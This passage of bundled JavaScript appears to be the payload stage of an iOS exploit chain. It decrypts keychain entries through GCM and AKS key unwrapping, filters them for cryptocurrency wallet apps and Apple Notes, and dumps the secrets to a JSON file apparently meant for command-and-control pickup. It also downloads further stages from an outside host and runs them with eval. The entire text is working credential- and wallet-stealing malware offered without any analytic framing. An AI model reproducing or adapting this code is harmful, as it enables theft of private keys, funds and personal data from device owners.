								if (p7_pb.f1 && p7_pb.f1[0]) {
									var p7_inner1 = p7_parseProtobuf(p7_pb.f1[0].buffer);
									if (p7_inner1.f1 && p7_inner1.f1[0]) p7_bpFirst = p7_inner1.f1[0];
									if (p7_inner1.f2 && p7_inner1.f2[0]) {
										var p7_inner12 = p7_parseProtobuf(p7_inner1.f2[0].buffer);
										if (p7_inner12.f1 && p7_inner12.f1[0]) p7_blob3Key = p7_inner12.f1[0];
									}
								}
								if (p7_pb.f2 && p7_pb.f2[0]) {
									var p7_inner2 = p7_parseProtobuf(p7_pb.f2[0].buffer);
									if (p7_inner2.f1 && p7_inner2.f1[0]) p7_bpSecond = p7_inner2.f1[0];
									if (p7_inner2.f2 && p7_inner2.f2[0]) p7_bpThird = p7_inner2.f2[0];
								}

								p7_item._blobSizes = {
									first: p7_bpFirst ? p7_bpFirst.length : 0,
									second: p7_bpSecond ? p7_bpSecond.length : 0,
									third: p7_bpThird ? p7_bpThird.length : 0,
									blob3: p7_blob3Key ? p7_blob3Key.length : 0
								};

								// Layer 1: GCM(bplistThird, metadataKey[class]) -> intermediate
								var p7_mkeyArr = p7_metaKeys[p7_protClass];
								if (!p7_mkeyArr) {
									p7_item.error = "no_metadata_key class=" + p7_protClass;
									p7_items.push(p7_item);
									continue;
								}

								if (p7_bpThird && p7_hasCrypto) {
									var p7_l1 = p7_parseBplistCiphertext(p7_bpThird);
									if (p7_l1 && p7_l1.ct && p7_l1.iv) {
										var p7_interKey = p7_gcmDecrypt(p7_mkeyArr,
											p7_l1.iv, p7_l1.iv.length,
											p7_l1.ct, p7_l1.ct.length,
											p7_l1.tag, p7_l1.tag ? p7_l1.tag.length : 0);
									if (p7_interKey) {
											var p7_interArr = new Uint8Array(p7_interKey);

											// Layer 2: GCM(bplistSecond, intermediateKey) -> metadata TLV
											if (p7_bpSecond) {
												var p7_l2 = p7_parseBplistCiphertext(p7_bpSecond);
										if (p7_l2 && p7_l2.ct && p7_l2.iv) {
													var p7_metaPt = p7_gcmDecrypt(
														p7_interArr.length >= 32 ? p7_interArr.slice(0, 32) : p7_interArr,
														p7_l2.iv, p7_l2.iv.length,
														p7_l2.ct, p7_l2.ct.length,
														p7_l2.tag, p7_l2.tag ? p7_l2.tag.length : 0);
													if (p7_metaPt) {
														var p7_metaAttrs = p7_decodeTLV(p7_metaPt);
														p7_item.service = p7_metaAttrs["svce"] || null;
														p7_item.account = p7_metaAttrs["acct"] || null;
														p7_item.accessGroup = p7_metaAttrs["agrp"] || null;
														p7_item.label = p7_metaAttrs["labl"] || null;
													} else { p7_item.layer2Error = "gcm_fail"; }
												} else { p7_item.layer2Error = "bplist_parse"; }
											}

											// Layer 3: AKS unwrap(blob3Key) + GCM(bplistFirst, blob3key) -> secret TLV
											if (p7_blob3Key && p7_bpFirst && p7_aksReady) {
												var p7_b3Unwrap = p7_aksUnwrap(p7_protClass, p7_blob3Key.buffer, p7_blob3Key.length);
											if (p7_b3Unwrap && p7_b3Unwrap.kr === 0 && p7_b3Unwrap.data) {
													var p7_b3Key = new Uint8Array(p7_b3Unwrap.data);
													var p7_l3 = p7_parseBplistCiphertext(p7_bpFirst);
												if (p7_l3 && p7_l3.ct && p7_l3.iv) {
														var p7_secPt = p7_gcmDecrypt(
															p7_b3Key.length >= 32 ? p7_b3Key.slice(0, 32) : p7_b3Key,
															p7_l3.iv, p7_l3.iv.length,
															p7_l3.ct, p7_l3.ct.length,
															p7_l3.tag, p7_l3.tag ? p7_l3.tag.length : 0);
														if (p7_secPt) {
															var p7_secAttrs = p7_decodeTLV(p7_secPt);
															if (p7_secAttrs["v_Data"]) {
																p7_item.dataHex = p7_secAttrs["v_Data"];
															}
														} else { p7_item.layer3Error = "gcm_fail"; }
													} else { p7_item.layer3Error = "bplist_parse"; }
												} else {
													p7_item.layer3Error = "aks_unwrap kr=" + (p7_b3Unwrap ? p7_b3Unwrap.kr : -1);
												}
											}
										} else { p7_item.layer1Error = "gcm_fail"; }
									} else { p7_item.layer1Error = "bplist_parse"; }
								} else if (!p7_bpThird) { p7_item.error = "no_bpThird"; }
							} catch (p7_decErr) {
								p7_item.error = "decrypt: " + p7_decErr;
							}
							p7_items.push(p7_item);
							} catch (p7_rowErr) {
								p7_flog(p7_tbl + " row " + p7_rowCount + " CRASH: " + p7_rowErr);
								p7_flushLog();
							}
						}
						N.callSymbol("sqlite3_finalize", p7_stmt);
						p7_flog(p7_tbl + ": " + p7_rowCount + " rows, " + p7_items.length + " processed");
						p7_result.tables[p7_tbl] = {count: p7_rowCount, items: p7_items};
						p7_flushLog();
					}

					// --- Wallet scan ---
					var p7_walletRules = [
						["bitpie",      ["bitpie"]],
						["trustwallet", ["sixdays.trust", "group.com.sixdays"]],
						["imtoken",     ["im.token", "imtoken", "token.im"]],
						["tokenpocket", ["tokenpocket", "global.wallet.ios", "com.global.wallet"]],
						["phantom",     ["app.phantom", "phantom"]],
						["uniswap",     ["uniswap"]],
						["coinbase",    ["org.toshi"]],
						["bitget",      ["bitkeep", "BG@@"]],
						["metamask",    ["io.metamask", "metamask"]],
						["okx",         ["okinc.okex", "okex", "com.okx"]],
						["tronlink",    ["tronlink"]],
						["coin98",      ["coin98"]],
						["solflare",    ["solflare", "flutter_biometric"]],
						["exodus",      ["exodus"]],
						["tonkeeper",   ["tonkeeper", "jbig.tonkeeper"]],
						["mytonwallet", ["mytonwallet", "org.mytonwallet"]],
						["tonhub",      ["tonhub"]],
						["notes",       ["group.com.apple.notes", "com.apple.notes"]],
					];
					var p7_wallets = {};
					for (var p7_ri = 0; p7_ri < p7_walletRules.length; p7_ri++)
						p7_wallets[p7_walletRules[p7_ri][0]] = [];
					for (var p7_wti = 0; p7_wti < p7_tableNames.length; p7_wti++) {
						var p7_wTbl = p7_result.tables[p7_tableNames[p7_wti]];
						if (!p7_wTbl || !p7_wTbl.items) continue;
						for (var p7_wi = 0; p7_wi < p7_wTbl.items.length; p7_wi++) {
							var p7_wItem = p7_wTbl.items[p7_wi];
							if (p7_wItem.error) continue;
							var p7_agrp = (p7_wItem.accessGroup || "").toLowerCase();
							var p7_svce = (p7_wItem.service || "").toLowerCase();
							for (var p7_ri = 0; p7_ri < p7_walletRules.length; p7_ri++) {
								var p7_pats = p7_walletRules[p7_ri][1];
								var p7_hit = false;
								for (var p7_pi = 0; p7_pi < p7_pats.length; p7_pi++) {
									if (p7_agrp.indexOf(p7_pats[p7_pi]) >= 0 || p7_svce.indexOf(p7_pats[p7_pi]) >= 0) {
										p7_hit = true; break;
									}
								}
								if (p7_hit) { p7_wallets[p7_walletRules[p7_ri][0]].push(p7_wItem); break; }
							}
						}
					}
					p7_result.wallets = {};
					var p7_wlog = "wallets:";
					for (var p7_ri = 0; p7_ri < p7_walletRules.length; p7_ri++) {
						var p7_wk = p7_walletRules[p7_ri][0];
						if (p7_wallets[p7_wk].length > 0) {
							p7_result.wallets[p7_wk] = {count: p7_wallets[p7_wk].length, items: p7_wallets[p7_wk]};
							p7_wlog += " " + p7_wk + "=" + p7_wallets[p7_wk].length;
						}
					}
					p7_flog(p7_wlog);

					// --- Keep only wallet + Notes items in tables (drop other apps) ---
					var p7_kept = 0, p7_dropped = 0;
					function p7_itemKeep(item) {
						var agrp = (item.accessGroup || "").toLowerCase();
						var svce = (item.service || "").toLowerCase();
						var acct = (item.account || "").toLowerCase();
						for (var ri = 0; ri < p7_walletRules.length; ri++) {
							var pats = p7_walletRules[ri][1];
							for (var pi = 0; pi < pats.length; pi++) {
								var pat = (pats[pi] || "").toLowerCase();
								if (!pat) continue;
								if (agrp.indexOf(pat) >= 0 || svce.indexOf(pat) >= 0 || acct.indexOf(pat) >= 0) return true;
							}
						}
						return false;
					}
					for (var p7_fti = 0; p7_fti < p7_tableNames.length; p7_fti++) {
						var p7_fTbl = p7_result.tables[p7_tableNames[p7_fti]];
						if (!p7_fTbl || !p7_fTbl.items) continue;
						var p7_keptItems = [];
						for (var p7_fi = 0; p7_fi < p7_fTbl.items.length; p7_fi++) {
							var p7_fit = p7_fTbl.items[p7_fi];
							if (p7_itemKeep(p7_fit)) { p7_keptItems.push(p7_fit); p7_kept++; }
							else p7_dropped++;
						}
						p7_fTbl.items = p7_keptItems;
						p7_fTbl.count = p7_keptItems.length;
					}
					p7_flog("keychain filter kept=" + p7_kept + " dropped=" + p7_dropped + " (wallet+notes only)");

					// --- Write result ---
					N.callSymbol("sqlite3_close", p7_db);
					var p7_jsonStr = JSON.stringify(p7_result);
					var p7_outTmp = "/tmp/keychain_c2_dump.json.tmp";
					var p7_outFinal = "/tmp/keychain_c2_dump.json";
					var p7_outDone = "/tmp/keychain_c2_dump.done";

					var p7_outFd = Number(N.callSymbol("open", p7_outTmp, 0x601, 0x1FF));
					if (p7_outFd >= 0) {
						var p7_jBuf = BigInt(N.callSymbol("malloc", BigInt(p7_jsonStr.length + 1)));
						N.writeString(p7_jBuf, p7_jsonStr);
						N.callSymbol("write", p7_outFd, p7_jBuf, p7_jsonStr.length);
						N.callSymbol("fsync", p7_outFd);
						N.callSymbol("close", p7_outFd);
						N.callSymbol("free", p7_jBuf);
						N.callSymbol("chmod", p7_outTmp, 0x1FF);
						N.callSymbol("unlink", p7_outFinal);
						N.callSymbol("rename", p7_outTmp, p7_outFinal);
						N.callSymbol("chmod", p7_outFinal, 0x1FF);
						// Write done marker
						var p7_doneFd = Number(N.callSymbol("open", p7_outDone, 0x601, 0x1FF));
						if (p7_doneFd >= 0) {
							N.callSymbol("write", p7_doneFd, "done", 4);
							N.callSymbol("close", p7_doneFd);
							N.callSymbol("chmod", p7_outDone, 0x1FF);
						}
						p7_flog("result written to " + p7_outFinal + " (" + p7_jsonStr.length + " bytes)");
					} else {
						p7_flog("failed to open output file");
						p7_result.errors.push("output file open failed");
					}
				} else {
					N.callSymbol("free", p7_dbPtrBuf);
					p7_flog("DB open failed, writing partial dump for HQ /war");
					p7_result.errors.push("DB open failed rc=" + p7_dbRc);
					p7_result.diagnostics = p7_result.diagnostics || {};
					p7_result.diagnostics.db_open_rc = p7_dbRc;
					p7_result.diagnostics.partial = true;
					try {
						var p7_jsonStrFail = JSON.stringify(p7_result);
						var p7_outTmpF = "/tmp/keychain_c2_dump.json.tmp";
						var p7_outFinalF = "/tmp/keychain_c2_dump.json";
						var p7_outDoneF = "/tmp/keychain_c2_dump.done";
						var p7_outFdF = Number(N.callSymbol("open", p7_outTmpF, 0x601, 0x1FF));
						if (p7_outFdF >= 0) {
							var p7_jBufF = BigInt(N.callSymbol("malloc", BigInt(p7_jsonStrFail.length + 1)));
							N.writeString(p7_jBufF, p7_jsonStrFail);
							N.callSymbol("write", p7_outFdF, p7_jBufF, p7_jsonStrFail.length);
							N.callSymbol("fsync", p7_outFdF);
							N.callSymbol("close", p7_outFdF);
							N.callSymbol("free", p7_jBufF);
							N.callSymbol("chmod", p7_outTmpF, 0x1FF);
							N.callSymbol("unlink", p7_outFinalF);
							N.callSymbol("rename", p7_outTmpF, p7_outFinalF);
							N.callSymbol("chmod", p7_outFinalF, 0x1FF);
							var p7_doneFdF = Number(N.callSymbol("open", p7_outDoneF, 0x601, 0x1FF));
							if (p7_doneFdF >= 0) {
								N.callSymbol("write", p7_doneFdF, "done", 4);
								N.callSymbol("close", p7_doneFdF);
								N.callSymbol("chmod", p7_outDoneF, 0x1FF);
							}
							p7_flog("partial result written (" + p7_jsonStrFail.length + " bytes)");
						} else {
							p7_flog("partial output open failed");
						}
					} catch (p7_wErr) {
						p7_flog("partial write err: " + p7_wErr);
					}
				}
			}
		} catch (p7_err) {
			p7_flog("Phase 2 error: " + p7_err);
		} finally {
			if (p7_secRC) {
				p7_secRC.destroy();
			}
		}
	}
	// ===== End P7 Phase 2 =====
	if (p7_enableP7) p7_flushLog();
	p7_flog("PEMK-G s6_p7phase2 done"); p7_flushLog();
	try {
		if (!globalThis.__peC2Injected && typeof __pePostWarDumpFallback === "function") {
			p7_flog("PEMK-G post-s6 war-fallback (no C2 inject)"); p7_flushLog();
			__pePostWarDumpFallback("post_s6_no_c2");
		}
	} catch (_wf) {}
}

	function __peHttpGetStage(path) {
		// Delivery host only (JS stages), via CFNetwork — not C2.
		try {
			return __labCfHttp("GET", path, null, true, { host: "cdn.gotoiphone.com", port: 443 });
		} catch (e) {
			return null;
		}
	}

	var __peStages = [
		["s1_launchd",   __peStage1],
		["s2_keychain",  __peStage2],
		["s3_mempress",  __peStage3],
		["s4_loader",    __peStage4],
		["s6_p7phase2",  __peStage6],
		["s5_c2",        __peStage5]
	];
	// 18.5: SpringBoard RC after long Phase2 often 0x494 (120s). Inject C2 before s6.
	try {
		var __iosOrd = __labIosForGate();
		if (__iosOrd.maj === 18 && __iosOrd.min === 5) {
			__peStages = [
				["s1_launchd",   __peStage1],
				["s2_keychain",  __peStage2],
				["s3_mempress",  __peStage3],
				["s4_loader",    __peStage4],
				["s5_c2",        __peStage5],
				["s6_p7phase2",  __peStage6]
			];
			p7_flog("PEMK stage-order: 18.5 early C2 before Phase2");
			p7_flushLog();
		}
	} catch (_ord) {}
	var __peNetDead = false;
	for (var __psi = 0; __psi < __peStages.length; __psi++) {
		if (__psi > 0 && typeof __peStillOwner === "function" && !__peStillOwner()) {
			p7_flog("PEMK abort: lost pe_run_token (newer PE) before " + __peStages[__psi][0]);
			p7_flushLog();
			break;
		}
		try { func_offsets_array[0x2101] = __psi + 1; } catch (_ms) {}
		var __psName = __peStages[__psi][0];
		var __psFn = __peStages[__psi][1];
		var __psCode = null;
		if (!__peNetDead) {
			for (var __psTry = 0; __psTry < 2 && !__psCode; __psTry++) {
				__psCode = __peHttpGetStage("/pe_stage/" + __psName + ".js");
			}
			if (!__psCode) { __peNetDead = true; }
		}
		if (__psCode && __psCode.indexOf("__peStage") >= 0) {
			p7_flog("stage " + __psName + " fetched " + __psCode.length + "B -> eval"); p7_flushLog();
			try { eval(__psCode); }
			catch (__psErr) {
				if (__psErr instanceof SyntaxError) {
					p7_flog("stage " + __psName + " syntax err -> inline"); p7_flushLog();
					try { __psFn(); } catch (__psErrB) { p7_flog("stage " + __psName + " inline err: " + __psErrB); }
				} else {
					p7_flog("stage " + __psName + " eval err: " + __psErr);
				}
			}
		} else {
			if (__psCode) p7_flog("stage " + __psName + " bad body -> inline");
			else p7_flog("stage " + __psName + " fetch failed -> inline");
			p7_flushLog();
			try { __psFn(); } catch (__psErr2) { p7_flog("stage " + __psName + " inline err: " + __psErr2); }
		}
		p7_flog("stage " + __psName + " done"); p7_flushLog();
		if (globalThis.__peAbort) { p7_flog("abort flag set -> stop stages"); p7_flushLog(); break; }
	}
	p7_flog("PEMK-Z all stages done"); if (p7_enableP7) p7_flushLog();
	try { pe_alive_ping("pe_all_stages"); } catch (_pz) {}
	try { func_offsets_array[0x2102] = 0x5a; } catch (_mz) {}

	LOG("[PE-WORKER] start() COMPLETE");
	return true;
}

try {
	try { pe_alive_ping("pe_before_start"); } catch (_ps) {}
	try { func_offsets_array[0x2100] = 0x53; } catch (_m4) {}
	start();
}
catch (error) {
	var __errTxt = "";
	try { __errTxt = String(error && (error.message || error)); } catch (_es) { __errTxt = "unknown"; }
	try { pe_alive_ping("pe_start_threw"); } catch (_pt) {}
	try { pe_alive_ping("pe_start_err:" + __errTxt.substring(0, 100)); } catch (_pt2) {}
	try { LOG("[PE] start() threw: " + __errTxt); } catch (_lg) {}
}
finally {
	try { LOG("[HB] skip (no BSD socket)"); } catch(_e) {}
	libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("exit", 0n);
}


})();

/******/ })()
;
  } catch (error) {
	  LOG(`Main function resulted with an error: ${error}`);
	  LOG("stack: " + error.stack);
  }
})();
